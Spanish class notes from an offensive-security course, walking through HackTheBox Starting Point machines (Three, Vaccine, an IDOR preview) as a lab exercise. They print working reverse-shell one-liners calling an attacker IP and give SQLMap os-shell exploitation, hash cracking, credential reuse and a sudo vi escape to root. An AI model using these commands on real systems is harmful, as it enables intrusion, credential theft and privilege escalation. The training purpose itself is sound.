---
tags:
- Máquinas y prácticas
date: '2026-06-10'
---

# HTB Tier 2

<p class="note-meta">2026-06-10</p>

**EVOLVE ACADEMY · Máster en Ciberseguridad Ofensiva**

# HTB Starting Point — Repaso e inicio de Tier 2

**Sesión del 10/06/2026** · Web Shell vs Reverse Shell · Máquina Vaccine · Introducción a IDOR

| **ℹ Resumen de la sesión**  Clase de repaso y avance. Se repasó la configuración de **FoxyProxy + Burp Suite**, la diferencia entre **web shell** y **reverse shell** (máquina Three) y se resolvió por completo la máquina **Vaccine** del Tier 2: enumeración, FTP anónimo, crackeo de ZIP, crackeo de hash MD5, inyección SQL con SQLMap, shell estable, acceso por SSH y escalada de privilegios a root con GTFOBins.  Al final se dio un vistazo a la siguiente máquina (vulnerabilidad **IDOR** + manipulación de cookies + subida de archivos), que se resolverá en la próxima clase del lunes. |
| --- |

## Conexión con sesiones anteriores

Esta sesión enlaza directamente con lo visto en clases previas y lo amplía:

- **Tier 0 y Tier 1** ya completados (Meow, Fawn, Dancing, Redeemer, Responder, Three). Hoy se cierra el repaso de **Three** y se empieza el **Tier 2**.
- **Responder** introdujo el flujo LFI → captura NTLMv2 → evil-winrm. Aquí reaparece la idea de **conseguir credenciales y reutilizarlas** para acceder por un servicio (en Vaccine, por SSH).
- **Three** introdujo S3/AWS, ffuf/feroxbuster y la **web shell**. Hoy se compara con la **reverse shell** y se reutiliza netcat como listener.
- El crackeo de hashes con **John the Ripper** y **Hashcat** ya apareció en la serie de Metasploitable 2; hoy se aplica a un ZIP protegido y a un hash MD5.
- La escalada de privilegios en Linux con sudo -l + **GTFOBins** se ve aquí por primera vez de forma completa.

## Cadena de ataque de la máquina Vaccine (visión global)

Toda la máquina sigue esta ruta de principio a fin:

| **nmap -sC -sV** | **→** | **FTP anónimo → backup.zip** | **→** | **zip2john + john** | **→** | **unzip → hash MD5** |
| --- | --- | --- | --- | --- | --- | --- |

| **Crack MD5 → login** | **→** | **SQLi (SQLMap --os-shell)** | **→** | **Reverse shell estable** | **→** | **dashboard.php → creds** |
| --- | --- | --- | --- | --- | --- | --- |

| **SSH postgres@IP** | **→** | **user.txt** | **→** | **sudo -l → vi (GTFOBins)** | **→** | **ROOT → root.txt** |
| --- | --- | --- | --- | --- | --- | --- |

# 1. Configuración del entorno: FoxyProxy + Burp Suite

Repaso para quien no lo dejó instalado. El objetivo es poder interceptar y modificar peticiones HTTP entre el navegador y el servidor.

### Crear el proxy en FoxyProxy

1. En FoxyProxy → **Options** → **Proxies** → **Add**.
2. Título: el que quieras (en clase se usó «Burp»).
3. Hostname / IP: 127.0.0.1 · Puerto: 8080 → **Save**.

Con eso quedan dos opciones para activar o desactivar el proxy con un clic, sin tener que tocar la configuración de red cada vez.

### Importar el certificado CA de Burp

Sin el certificado, muchas webs (Google, HTTPS) no cargan porque no confían en el proxy de Burp.

1. Con Burp abierto y el proxy de FoxyProxy activado, visita http://burp en el navegador.
2. Descarga el **CA Certificate**.
3. Firefox → **Settings** → buscar **Certificates** → **View Certificates** → **Import**.
4. Selecciona el certificado, marca las dos casillas y **OK**. Esto solo se hace una vez.

| **⚠ Si una web no carga con Burp activado**  Revisa que Burp esté **abierto** y el proxy de FoxyProxy **activado**.  Comprueba que **Intercept** no esté pulsado de forma permanente: si está interceptando, la petición se queda «cargando» hasta que pulses **Forward**.  Una webshell puede ser bloqueada por el antivirus si la descargas en tu equipo Windows; descárgala dentro de la Kali. |
| --- |
| **✔ Alternativas si FoxyProxy + certificado da problemas**  **Navegador embebido de Burp** (pestaña Proxy → Intercept → \*Open Browser\*): ya viene preconfigurado, sin necesidad de proxy ni certificado externo. Funciona también en la versión Community.  Para tráfico de **apps móviles** o casos donde no se puede instalar el proxy fácilmente, hace falta configuración adicional de certificados; el flujo web normal no la necesita. |

# 2. Web Shell vs Reverse Shell (repaso máquina Three)

### La diferencia clave

|  | **Web Shell** | **Reverse Shell** |
| --- | --- | --- |
| Dónde se ejecuta | En el **propio servidor** donde la subimos | Hace una **conexión de vuelta** a nuestra máquina |
| Cómo interactuamos | Por una URL / casilla en la web | Por un puerto a la escucha en nuestro equipo (netcat) |
| Comodidad | Limitada, comando a comando | Sesión interactiva más cómoda |
| Usuario típico | www-data (usuario de servicio web) | www-data igualmente |

| **ℹ Idea importante sobre PHP**  Si subes un .php y al abrirlo **ves el código**, el servidor no lo está interpretando. Si al abrirlo **se queda cargando / ejecuta**, sí lo interpreta → puedes lograr ejecución de código. Ese es el comportamiento que aprovechas con la reverse shell. |
| --- |

### 2.1 Acceso al bucket S3 (AWS) y subida del archivo

En Three, tras enumerar con feroxbuster/ffuf, se llega a un bucket S3. Para interactuar hace falta tener instalado el **AWS CLI** y configurarlo (con valores cualquiera, no en blanco):

| **Acceso al bucket S3 con AWS CLI** |
| --- |
| *Configurar credenciales (basta poner valores no vacios: A, A, A...)*  $ aws configure  *Listar el contenido del bucket S3*  $ aws --endpoint-url=http://s3.<dominio> s3 ls  *Subir el archivo PHP al bucket (cp local -> s3)*  $ aws --endpoint-url=http://s3.<dominio> s3 cp shell.php s3://<bucket>/ |
| **⚠ Distinción transcripción vs. complemento**  En clase se mencionaron verbalmente aws configure, listar y cp. La **sintaxis exacta** (el parámetro --endpoint-url y los nombres del bucket/dominio) se ha completado aquí con la forma estándar de la máquina Three; ajústalos a la IP/host reales de tu instancia. |

### 2.2 Descargar y preparar las shells

| **Obtener webshell y reverse shell** |
| --- |
| *Descargar una webshell de ejemplo (enlace pasado en clase)*  $ wget http://<URL>/easy-simple-php-webshell.php  *Localizar la reverse shell de PHP que ya trae Kali*  $ locate php-reverse-shell.php  *Copiarla a tu directorio de trabajo*  $ cp /usr/share/webshells/php/php-reverse-shell.php . |

Edita la reverse shell y cambia **solo** lo que indica el comentario del propio archivo: tu **IP** y tu **puerto**.

| **Editar IP y puerto en la reverse shell** |
| --- |
| *Dentro del php-reverse-shell.php:*  $ $ip = '10.10.14.67'; // TU IP de atacante (tun0)  $ $port = 4444; // TU puerto a la escucha |
| **⛔ Error muy típico con la IP**  En la reverse shell debes poner **TU** IP (la de atacante), no la de la máquina víctima. El servidor ejecuta el .php y te manda la shell a ti; si pones la IP de la víctima, se la manda a sí misma y nunca llega. |

### 2.3 Listener con netcat y captura de la flag

| **Listener y flag** |
| --- |
| *Dejar el puerto a la escucha ANTES de disparar la shell*  $ nc -lvnp 4444  *Una vez recibida la shell, leer la flag*  $ id  $ cat flag.txt |
| **ℹ Sobre la elección de puerto**  El instructor recomienda probar primero con un puerto **poco común** (p. ej. 4444). Si da problemas (firewall de salida), usar puertos «de confianza» como **80** o **443**, que suelen estar permitidos en entornos reales. |
| **✔ Si nc / la reverse shell falla — alternativas**  **Listener alternativo:** rlwrap nc -lvnp 4444 (añade historial y edición de línea), o pwncat-cs -lp 4444, o ncat -lvnp 4444.  **Si la reverse shell PHP no conecta:** prueba un one-liner directo en la webshell: bash -c 'bash -i >& /dev/tcp/10.10.14.67/4444 0>&1'.  **Otros payloads:** nc -e /bin/bash 10.10.14.67 4444 (si nc lo soporta), Python python3 -c 'import socket,os,pty;...', o generar uno en **revshells.com**. |

# 3. Máquina Vaccine (Tier 2) — resolución completa

La parte principal de la clase. Se resuelve de principio a fin. A continuación cada fase con su comando principal y alternativas por si falla.

## 3.1 Enumeración con Nmap

El escaneo revela **3 puertos abiertos**: 21 (FTP), 22 (SSH) y 80 (HTTP). Lo importante es lanzar los scripts por defecto (-sC) y la detección de versiones (-sV): el propio Nmap nos avisa de que el FTP permite **sesión anónima** e incluso lista que hay un backup.zip.

| **Comando principal** |
| --- |
| *Escaneo con scripts por defecto + version (equivale a lanzar los scripts de enumeracion)*  $ nmap -sC -sV -oN nmap\_inicial.txt <IP> |
| **Si quieres / si falla...** | **Comando alternativo** |
| Asegurar TODOS los puertos primero | nmap -p- --min-rate 5000 <IP> y luego -sC -sV sobre los abiertos |
| Scripts FTP concretos | nmap -p21 --script ftp-anon,ftp-syst <IP> |
| Escaneo rápido | rustscan -a <IP> -- -sC -sV |
| UDP (por si acaso) | nmap -sU --top-ports 20 <IP> |

## 3.2 FTP anónimo y descarga del backup

Como Nmap confirma el acceso anónimo, nos conectamos con el usuario anonymous (contraseña vacía o cualquiera) y descargamos backup.zip. FTP es como un «pendrive» / carpeta compartida accesible desde fuera.

| **Descarga por FTP anónimo** |
| --- |
| *Conectar por FTP*  $ ftp <IP>  Usuario: anonymous / Password: (vacio o cualquier cosa)  *Dentro del prompt ftp>*  $ ftp> ls # ver el contenido (tambien 'dir')  $ ftp> binary # modo binario para no corromper el zip  $ ftp> get backup.zip  $ ftp> bye |
| **ℹ Comandos útiles dentro de FTP**  get descarga · put sube · ls/dir lista · binary cambia a modo binario (clave para archivos comprimidos) · bye/exit sale. |
| **Si el cliente ftp da problemas...** | **Alternativa** |
| Descargar todo de golpe sin entrar al prompt | wget --no-passive-ftp ftp://anonymous:anonymous@<IP>/backup.zip |
| Cliente más cómodo | lftp <IP> y luego mget \* |
| Vía curl | curl -u anonymous: ftp://<IP>/backup.zip -o backup.zip |

## 3.3 Crackeo del ZIP protegido (zip2john + John)

Al hacer unzip backup.zip nos pide contraseña. Convertimos el ZIP a un hash con zip2john y lo rompemos con **John the Ripper** usando el diccionario **rockyou**.

| **Crackeo del ZIP con John** |
| --- |
| *1) Extraer el hash del ZIP a un fichero*  $ zip2john backup.zip > romper.txt  *2) Romper con John usando rockyou*  $ john --wordlist=/usr/share/wordlists/rockyou.txt romper.txt  *3) Ver la contraseña encontrada*  $ john --show romper.txt  *4) Descomprimir con la contraseña obtenida*  $ unzip backup.zip |
| **ℹ Dato de la clase**  Si rockyou.txt está comprimido: gunzip /usr/share/wordlists/rockyou.txt.gz. Recuerda usar **TAB** para autocompletar rutas y agilizar. |
| **✔ Alternativas para romper el ZIP**  **fcrackzip:** fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip.  **Hashcat (modo 13600 = WinZip):** hashcat -m 13600 romper.txt /usr/share/wordlists/rockyou.txt.  Si john no detecta el formato, fuérzalo con --format=zip o --format=PKZIP según corresponda. |

## 3.4 Crackeo del hash MD5 del panel de login

Dentro del ZIP hay un index.php y un style.css. En el código PHP del login se ve que el usuario es admin y que la contraseña está guardada como **hash MD5**. Como es un MD5 «pelado» (sin sal compleja), es muy fácil de romper.

| **Crackeo del MD5 con John** |
| --- |
| *Guardar el hash en un fichero*  $ echo '<hash\_md5\_del\_index\_php>' > hash.txt  *Romper con John indicando el formato raw-md5*  $ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  $ john --show --format=raw-md5 hash.txt |
| **⚠ raw-md5 vs md5crypt — no confundir**  En clase se aclaró: este caso es **MD5 «a secas» (raw-md5)**, no md5crypt. Por eso en Hashcat el modo es **0** (-m 0). El md5crypt (que empieza por $1$...) es **distinto** y usa otro modo. Verifica siempre el formato del hash antes de lanzar. |
| **Herramienta** | **Comando** |
| **Hashcat** (MD5 = modo 0) | hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt |
| **Online** (rápido para CTF) | Pegar el hash en crackstation.net o hashes.com |
| John auto-detect | john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt (sin --format, prueba a adivinar) |

## 3.5 Inyección SQL con SQLMap (autenticado, con cookie)

Tras loguear como admin, el panel **MegaCorp** tiene un buscador. Al meter una **comilla** salta un error que muestra la consulta (SELECT ... FROM cars WHERE name LIKE ...): indicio clarísimo de **SQL Injection basada en error**.

| **ℹ Por qué hace falta la cookie**  El parámetro vulnerable (search en dashboard.php) **solo es accesible estando logueado**. Desde fuera (incógnito) te redirige al login. Por eso hay que pasarle a SQLMap la **cookie de sesión** (PHPSESSID).  Conseguir la cookie: navegador → **Inspeccionar** → **Storage** → **Cookies** → copiar el valor de PHPSESSID. También se puede sacar capturando la petición con **Burp**. |
| --- |
| **SQLMap → os-shell** |
| *SQLMap autenticado: URL con parametro + cookie de sesion + intentar shell*  $ sqlmap -u 'http://<IP>/dashboard.php?search=test' \  $ --cookie='PHPSESSID=<valor\_de\_tu\_cookie>' --os-shell --batch |
| **⚠ Formateo de comandos**  Aquí se muestra partido por legibilidad, pero recuerda escribirlo en **una sola línea** (sin la barra \). El error típico en clase fue olvidar el **nombre** de la cookie: hay que poner PHPSESSID=valor, no solo el valor. |

Con --os-shell, SQLMap aprovecha la inyección para darnos una shell del sistema. La máquina es **Linux** y el servicio SQL es **PostgreSQL**, por lo que la shell sale como usuario postgres.

| **✔ Si SQLMap no encuentra/explota la inyección — alternativas**  **Pasar la petición completa por Burp:** guarda la request en un fichero y sqlmap -r peticion.txt --os-shell --batch (lleva la cookie incluida).  **Subir el nivel/riesgo:** --level=5 --risk=3, y forzar técnica/DBMS: --dbms=postgresql --technique=E.  **Explotación manual** (lo que SQLMap automatiza): UNION-based / error-based directamente en el buscador.  **Ghauri** como alternativa a SQLMap: ghauri -u '...' --cookie '...'. |
| --- |

## 3.6 Shell estable: reverse shell con /dev/tcp

La os-shell de SQLMap es incómoda y se cae. La solución es lanzarnos una **reverse shell** estable a un listener propio. Como es Linux, se usa el clásico de **bash**:

| **Reverse shell estable** |
| --- |
| *En tu Kali: listener a la escucha*  $ nc -lvnp 445  *Desde la os-shell de SQLMap: lanzar la reverse a TU IP y puerto*  $ bash -c 'bash -i >& /dev/tcp/10.10.14.67/445 0>&1' |
| **ℹ Anatomía del comando (no hay que memorizarlo)**  bash -c '...' ejecuta lo que va entre comillas · bash -i shell interactiva · >& /dev/tcp/IP/PUERTO redirige toda la E/S a una conexión TCP a tu equipo · 0>&1 ata la entrada estándar a esa misma conexión.  Lo único que cambias siempre es **la IP** (la tuya) y **el puerto** (el que pusiste a la escucha). Guárdalo en tu chuleta. |
| **✔ Alternativas de reverse shell (Linux)**  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.67 445 >/tmp/f (FIFO clásico).  Python: python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("10.10.14.67",445));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'.  Genera el que necesites en **revshells.com** y pásalo por la os-shell. |
| **⚠ Estabilizar la TTY tras recibir la shell**  Para que no se rompa: python3 -c 'import pty;pty.spawn("/bin/bash")', luego Ctrl+Z, después stty raw -echo; fg, y export TERM=xterm. |

## 3.7 Credenciales en texto claro y acceso por SSH (flag de user)

Ya con shell estable, leemos dashboard.php en la ruta de la web. Ahí está la conexión a la base de datos cachedb en localhost:5432 con el usuario postgres y **la contraseña en texto claro** (mala configuración muy común). Reutilizamos esa contraseña para entrar por SSH.

| **Credenciales → SSH → user.txt** |
| --- |
| *Localizar y leer el dashboard.php (ruta de la web)*  $ cat /var/www/html/dashboard.php  -> usuario: postgres | password: <en\_texto\_claro>  *Reutilizar la contraseña por SSH*  $ ssh postgres@<IP>  *Primera flag (usuario)*  $ ls  $ cat user.txt |
| **⛔ Mala práctica detectada**  Tener la contraseña de la base de datos **en texto claro** dentro de un .php accesible es un fallo grave de configuración. El PHP normalmente no se ve desde el navegador (es backend), pero con acceso al sistema de ficheros queda expuesto. |
| **✔ Si el SSH directo falla**  Comprueba el usuario exacto y que el puerto 22 esté accesible (ssh -v postgres@<IP> para depurar).  Si SSH rechaza por algoritmos antiguos: ssh -oHostKeyAlgorithms=+ssh-rsa postgres@<IP>. |

## 3.8 Escalada de privilegios a root (sudo -l + GTFOBins)

Desde el usuario postgres no podemos hacer su a root. La técnica en Linux es comprobar qué se nos permite ejecutar con privilegios mediante sudo -l. Aquí descubrimos que podemos ejecutar **`/bin/vi`** (vim) como root sobre cierto fichero — un permiso explotable según **GTFOBins**.

| **Reconocimiento de privilegios** |
| --- |
| *Comandos que SIEMPRE hay que probar al conseguir un usuario en Linux*  $ sudo -l  -> (postgres) puede ejecutar /bin/vi /etc/postgresql/... como root |

Según GTFOBins, si puedes lanzar vi/vim con sudo, puedes abrir una shell desde dentro del editor:

| **Escalada con vi (GTFOBins)** |
| --- |
| *Abrir el fichero permitido CON sudo (clave: no olvidar sudo)*  $ sudo /bin/vi /etc/postgresql/11/main/pg\_hba.conf  *Dentro de vi, escapar a una shell de root:*  $ :!/bin/bash  (o bien :set shell=/bin/bash y luego :shell )  *Ya como root: leer la flag final*  $ id  $ cat /root/root.txt |
| **ℹ Por qué funciona**  El binario se ejecuta **como root** (vía sudo) y tenemos permiso para lanzarlo. Al abrir una shell desde dentro de vi, esa shell hereda el contexto de root. Si lo lanzáramos como usuario normal, la shell saldría como ese usuario.  Recurso a guardar: **GTFOBins** (gtfobins.github.io) lista, binario por binario, cómo abusar de cada permiso sudo. |
| **⛔ Error más común en esta fase**  Olvidar el **`sudo`** al abrir el editor. Sin sudo, vi se ejecuta como postgres y la shell que abras será de postgres, no de root. |
| **✔ Concepto relacionado: tareas programadas (cron)**  Otra vía de escalada que se mencionó: un **cron** que ejecuta un script **como root** cada cierto tiempo. Si ese script es modificable por un usuario sin privilegios, puedes inyectar tu payload y esperar a que root lo ejecute por ti. |

# 4. Vistazo a la siguiente máquina: IDOR + cookies + upload

Al final de la clase se vio por encima la próxima máquina (se resolverá entera el lunes). Introduce conceptos nuevos respecto a Vaccine.

### 4.1 Descubrir el login oculto

Inspeccionando el código se encontró una referencia a /cdn-cgi/login/script.js. Quitando script.js de la ruta aparece el **panel de login**.

| **Login oculto** |
| --- |
| *De la ruta del JS...*  http://<IP>/cdn-cgi/login/script.js -> 404  *Quitamos el script y aparece el login*  $ http://<IP>/cdn-cgi/login/ |

### 4.2 IDOR (Insecure Direct Object Reference)

Tras entrar como invitado, la URL del panel usa un parámetro id. Cambiando el número se accede a datos de otros usuarios — incluido el administrador.

| **Patrón IDOR** |
| --- |
| *El panel carga con id=2 (guest)*  http://<IP>/cdn-cgi/login/admin.php?content=accounts&id=2  *Cambiamos a id=1 -> datos del administrador (access ID, role...)*  $ http://<IP>/cdn-cgi/login/admin.php?content=accounts&id=1 |
| **ℹ Qué es IDOR y por qué importa**  **IDOR** = acceder a objetos de otros usuarios cambiando un identificador directo (id=2 → id=1, o user1 → user2). El id no tiene por qué ser numérico: puede ser una letra o un nombre.  Es **muy común** en el mundo real (facturas, nóminas, perfiles antiguos). Cualquiera que vea ?id=2 puede pensar en probar ?id=1. Está catalogado en el TOP de vulnerabilidades web. |

### 4.3 Manipulación de cookies para escalar a admin

Con el **role** y el **access ID** del admin obtenidos por IDOR, se editan las cookies del navegador (cambiar role=guest → role=admin y el user/accessID por el del administrador) y al refrescar se accede al panel de administración.

| **✔ Siguiente paso (subida de archivos)**  El panel admin tiene un **upload**. Si permite subir un .php y el servidor lo **interpreta**, se consigue ejecución de código → reverse shell (igual que en Three). Esto se rematará en la clase del lunes. |
| --- |
| **⚠ Recordatorio del instructor para webs**  Siempre que veas un **buscador**, prueba **comillas** (una y dos): si una comilla da error pero dos no, es indicio fuerte de SQLi. Siempre que veas un **`id` en la URL**, prueba a cambiarlo (IDOR). E **inspecciona el código**: el JS siempre se ve (front), el PHP no (back). |

# 5. Chuleta rápida de comandos (con alternativas)

Resumen accionable de toda la sesión. Comando principal y alternativa por si el primero falla.

| **Fase** | **Comando principal** | **Alternativa / si falla** |
| --- | --- | --- |
| Enumerar puertos | nmap -sC -sV <IP> | nmap -p- --min-rate 5000 <IP> · rustscan |
| FTP anónimo | ftp <IP> → get backup.zip | wget ftp://anonymous:anonymous@<IP>/backup.zip |
| Hash del ZIP | zip2john backup.zip > h.txt | fcrackzip -u -D -p rockyou.txt backup.zip |
| Romper ZIP | john --wordlist=rockyou.txt h.txt | hashcat -m 13600 h.txt rockyou.txt |
| Romper MD5 | john --format=raw-md5 ... hash.txt | hashcat -m 0 hash.txt rockyou.txt · crackstation |
| SQLi auto | sqlmap -u '...?search=x' --cookie='PHPSESSID=...' --os-shell | sqlmap -r req.txt --os-shell --batch · ghauri |
| Reverse shell | bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1' | FIFO con mkfifo+nc · Python pty · revshells.com |
| Listener | nc -lvnp <PORT> | rlwrap nc -lvnp <PORT> · pwncat-cs -lp <PORT> |
| Reutilizar creds | ssh <user>@<IP> | ssh -oHostKeyAlgorithms=+ssh-rsa <user>@<IP> |
| Ver privilegios | sudo -l | sudo -u#-1 ... · revisar cron, SUID (find / -perm -4000) |
| Escalar con binario | sudo /bin/vi <file> → :!/bin/bash | Consultar el binario en **GTFOBins** |
| Leer flags | cat user.txt / cat /root/root.txt | — |

# 6. Herramientas utilizadas en la sesión

| **Herramienta** | **Objetivo** | **Fase** | **Comando / uso visto** | **Nivel** |
| --- | --- | --- | --- | --- |
| Nmap | Enumeración de puertos y servicios | Reconocimiento | nmap -sC -sV <IP> | Recurrente |
| FoxyProxy | Gestionar el proxy del navegador | Config / Web | Perfil 127.0.0.1:8080 | Practicado |
| Burp Suite | Interceptar/modificar peticiones HTTP | Web | Intercept, cert CA, navegador embebido | Introducido |
| AWS CLI | Interactuar con bucket S3 | Web / Cloud | aws configure, s3 ls/cp | Practicado |
| wget / curl | Descargar archivos (web/FTP) | Varias | wget <url> / FTP | Recurrente |
| netcat (nc) | Listener de reverse shell | Explotación | nc -lvnp <port> | Recurrente |
| php-reverse-shell | Conseguir ejecución remota | Explotación | Editar IP+puerto | Practicado |
| ftp | Acceso a servicio FTP | Acceso | ftp, get, binary | Practicado |
| zip2john | Extraer hash de un ZIP | Cracking | zip2john backup.zip | Introducido |
| John the Ripper | Romper hashes (ZIP, MD5) | Cracking | john --wordlist=rockyou | Recurrente |
| Hashcat | Romper hashes (GPU) | Cracking | -m 0 MD5, -m 13600 ZIP | Practicado |
| SQLMap | Inyección SQL automatizada | Explotación web | --cookie, --os-shell | Introducido |
| ssh | Acceso con credenciales | Acceso | ssh postgres@<IP> | Recurrente |
| sudo -l / GTFOBins | Escalada de privilegios | Post-explotación | sudo -l, vi → shell | Introducido |

## Checklist de metodología (resumen mental)

- Enumerar puertos y **leer bien** la salida de Nmap (te suele dar pistas: anon FTP, archivos, versiones).
- Recoger todo lo accesible sin auth (FTP anónimo, ficheros expuestos, backups).
- Romper lo protegido (ZIP, hashes) con John/Hashcat + rockyou; probar online en CTF.
- En la web: probar **comillas** (SQLi) y cambiar **ids** (IDOR); inspeccionar código (JS sí, PHP no).
- Conseguir un punto de apoyo (web/reverse shell) y **estabilizar** la TTY.
- Buscar **credenciales reutilizables** (ficheros de config, dashboards) y saltar a un servicio (SSH).
- Para root en Linux: sudo -l, sudo su, revisar **cron** y **SUID**, y apoyarse en **GTFOBins**.

## Actualización del registro de herramientas

Cambios respecto a sesiones anteriores tras esta clase:

- **Nuevas** en el registro: zip2john, SQLMap, AWS CLI (uso de configure+S3), GTFOBins como recurso de escalada.
- **Suben de nivel:** netcat y John the Ripper → **Recurrente** (usados en varias máquinas). Hashcat → **Practicado** (modos 0 y 13600).
- **Reaparecen:** Nmap, wget/curl, ssh, reverse shells PHP — consolidando la metodología base.
- **Pendiente para el lunes:** subida de archivos + webshell sobre la máquina con IDOR (continuación del Tier 2).

*Evolve Academy · Máster en Ciberseguridad Ofensiva · Sesión 10/06/2026 · HTB Starting Point Tier 2*
